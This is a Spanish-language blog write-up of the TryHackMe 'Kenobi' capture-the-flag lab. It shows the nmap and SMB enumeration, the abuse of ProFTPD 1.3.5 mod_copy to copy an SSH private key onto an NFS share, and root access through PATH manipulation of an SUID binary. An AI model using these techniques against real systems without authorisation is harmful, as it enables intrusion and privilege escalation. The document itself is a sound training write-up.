---
toc: true
comments: true
title: TryHackMe - Kenobi
layout: post
title: TryHackMe - Kenobi
date: 2024-05-09 18:28 -0300
categories: [TryHackMe, Easy, CTF]
tags: [Samba, ProFtp, Ftp, Path Variable Manipulation, Path, PrivEsc]    
image: /assets/Posts/Kenobi/logo.png
---

## Pre
- Continuando el Offensive Path de TryHackMe llegamos a Kenobi, una maquina que promete ser interesante al incluir desde Samba a FTP...ademas de que si sos tan nerd para leer un writeup de hacking te gusta Star Wars seguro
- [WHO’S GOT THE HIGH GROUND NOW OBIWAN?](https://youtu.be/OklSZmIx9-o?si=DfgUsNYwYigkHjFc&t=94)

![Hello There](https://media2.giphy.com/media/v1.Y2lkPTc5MGI3NjExc21tcjc5aHBpc2dvNHpjYWQxaG15YW94ZnE1eWc2cnptZmZ1bnVtOCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/xTiIzJSKB4l7xTouE8/giphy.gif)

## Phase 1: Recon

```shell
$ nmap -Pn -n -p- --min-rate 10000 --open -vv -oN nmap/firstScan $IP
PORT      STATE SERVICE      REASON
21/tcp    open  ftp          syn-ack
22/tcp    open  ssh          syn-ack
80/tcp    open  http         syn-ack
111/tcp   open  rpcbind      syn-ack
139/tcp   open  netbios-ssn  syn-ack
445/tcp   open  microsoft-ds syn-ack
2049/tcp  open  nfs          syn-ack
```

Tenemos 7 puertos abiertos, continuamos nuestro recon profundizando con varios escaneos en paralelo.

```shell
$ nmap -Pn -n -p 21,22,80,111,139,445,2049 -T4 -sSCV -A -oN nmap/versions $IP

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.5
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)
|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)
|_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/admin.html
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
111/tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100005  1,2,3      39325/tcp   mountd
|   100005  1,2,3      50313/udp   mountd
|   100005  1,2,3      57117/udp6  mountd
|   100005  1,2,3      60199/tcp6  mountd
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
2049/tcp open  nfs_acl     2-3 (RPC #100227)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 3.13 (96%), Linux 5.4 (96%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (93%), Sony Android TV (Android 5.0) (93%), Android 5.0 - 6.0.1 (Linux 3.4) (93%), Linux 3.12 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2024-05-05T19:15:00
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: kenobi
|   NetBIOS computer name: KENOBI\x00
|   Domain name: \x00
|   FQDN: kenobi
|_  System time: 2024-05-05T14:14:59-05:00
|_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s
```

Con esto nos dirigimos al predecible _/admin.html pero....

![Desktop View](/assets/Posts/Kenobi/1.png){: width="972" height="589" }
_ITS A TRAP_

Continuamos entonces con nuestra busqueda de servicios vulnerables. 

```shell
$ nmap -Pn -n -p 445 -T4 -script vuln -oN nmap/smb_vulner $IP
PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-regsvc-dos: 
|   VULNERABLE:
|   Service regsvc in Microsoft Windows systems vulnerable to denial of service
|     State: VULNERABLE
|       The service regsvc in Microsoft Windows 2000 systems is vulnerable to denial of service caused by a null deference
|       pointer. This script will crash the service if it is vulnerable. This vulnerability was discovered by Ron Bowes
|       while working on smb-enum-sessions.
|_          
|_smb-vuln-ms10-061: false
|_smb-vuln-ms10-054: false
```

Como no nos interesa denegar el servicio procedemos a ver los contendios (enumeracion de SMB via nmap)

```shell
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse -oN nmap/smbCheck 10.10.170.212
Nmap scan report for 10.10.170.212 (10.10.170.212)
Host is up (0.36s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.170.212\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.170.212\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.170.212\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>
```

Tenemos entonces acceso de READ/WRITE para el usuario anonimo. 

```shell
$ smbclient //$IP/anonymous

// Descarga recursiva

$ smbget -R smb://$IP/anonymous
```

La pass por defecto es "anonymous"...y funciona! Con eso tenemos acceso a un archivo llamado log.txt el mismo nos informa que mediante una rsa key podremos acceder al servidor.

![Desktop View](/assets/Posts/Kenobi/11.png){: width="972" height="589" }
_Log.txt_

El problema de esta key conocida es que esta en un punto inaccesible por nuestro smb, asi que tendremos que ver de encontrarla en otra parte...

Continuamos entonces nuestra investigacion sobre el puerto 111 que quizas nos permita ver archivos locales de la maquina al montarlas en nuestro dispositivo.

```shell
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount $IP
PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-showmount: 
|_  /var *
```
Tnemos entonces la necesidad de copiar de alguna forma esa clave `id_rsa` a esta carpeta compartida `/var`

## Phase 2: FTP`ed

Analizando la version de PProFtpd que nos dio `nmap` (ProFTPD 1.3.5) buscamos si es vulnerable a algo:

```shell
$ searchsploit ProFTPD 1.3.5             
---------------------------------------------------------- ---------------------------------
 Exploit Title                                            |  Path
---------------------------------------------------------- ---------------------------------
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit) | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution       | linux/remote/36803.py
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2)   | linux/remote/49908.py
ProFTPd 1.3.5 - File Copy                                 | linux/remote/36742.txt
---------------------------------------------------------- ---------------------------------
```

Para esto nos traeremos primero las instrucciones de texto mediante el comando `searchsploit -m linux/remote/36742.txt`

El módulo mod_copy implementa los comandos SITE CPFR y SITE CPTO, que se pueden usar para copiar archivos/directorios de un lugar a otro en el servidor. Cualquier cliente no autenticado puede aprovechar estos comandos para copiar archivos desde cualquier parte del sistema de archivos a un destino elegido. Sabemos que el servicio FTP se está ejecutando como el usuario Kenobi (según el archivo en el recurso compartido) y se ha generado una clave SSH para ese usuario.

El objetivo entonces es copiar esta clave aprovechando la vulnerabilidad de ProFTPd a un recurso compartido en SAMBA y luego poder tomar control de la maquina!

![Desktop View](/assets/Posts/Kenobi/3.png){: width="972" height="589" }
_Copia siguiendo los pasos del exploit_

Copiamos entonces el archivo a la carpeta que podemos montar en nuestra maquina, solo queda entonces montarla:

```shell
mkdir /mnt/Kenobi
mount $IP:/var /mnt/Kenobi
ls -la /mnt/kenobiNFS
```
![Desktop View](/assets/Posts/Kenobi/4.png){: width="972" height="589" }
_Carpeta montada con idrsa_

Ahora tendremos que copiar esta clave a nuestro sistema (recordar que no tendremos permisos en la maquina remota) y darle el permiso apropiado para una clave ssh (`chmod 600`). Luego la podremos utilizar:

```shell
ssh -i id_rsa kenobi@10.10.66.237      
```

Con eso ya estamos dentro, tendremos nuestra primera flag en el directorio de Kenobi!

## Phase 3: Force Priv Esc
Como siempre una de las tacticas basicas es buscar archivos que tengan el SUID Bit configurado para correr como su owner y no como quien los esta ejecutando.

```shell
$ find / -perm -u=s -type f 2>/dev/null
/sbin/mount.nfs
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/menu
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/at
/usr/bin/newgrp
/bin/umount
/bin/fusermount
/bin/mount
/bin/ping
/bin/su
/bin/ping6
```

A diferencia de los habituales aqui vemos un nuevo ejecutable llamado menu. Procedemos a ejecutarlo a ver que contiene:

![Desktop View](/assets/Posts/Kenobi/5.png){: width="972" height="589" }
_Carpeta montada con idrsa_

Tenemos entonces un menu que lo unico que hace es ejecutar comandos como `curl`, `ifconfig` y ver la version del kernel. Podemos explotar esto aprovechando cómo Linux interpreta la variable de entorno PATH. Linux busca ejecutables en los directorios especificados en PATH de izquierda a derecha. Entonces, si alguien crea un comando ifconfig malicioso y lo coloca al principio de PATH, al ser ejecutado como root, podría lanzar una shell con esos privilegios. Este tipo de ataque se conoce como ataque de PATH manipulation o manipulación de PATH.


```shell
kenobi@kenobi:~$ echo $PATH
/home/kenobi/bin:/home/kenobi/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

echo /bin/bash > ifconfig
chmod 777 ifconfig
export PATH=.:$PATH
```
Y luego al lanzar nuestro menu invocando `ifconfig` tendremos una shell root!

![Desktop View](/assets/Posts/Kenobi/6.png){: width="972" height="589" }
_Carpeta montada con idrsa_

## Conclusiones
- Vimos vulnerabilidad de copia de directorios y aprovechamos aceso muy permisivo al poder montar todo /var en nuestro sistema.
- Escalamos privilegios mediante manipulacion de PATH
- Restauramos el balance de la fuerza.




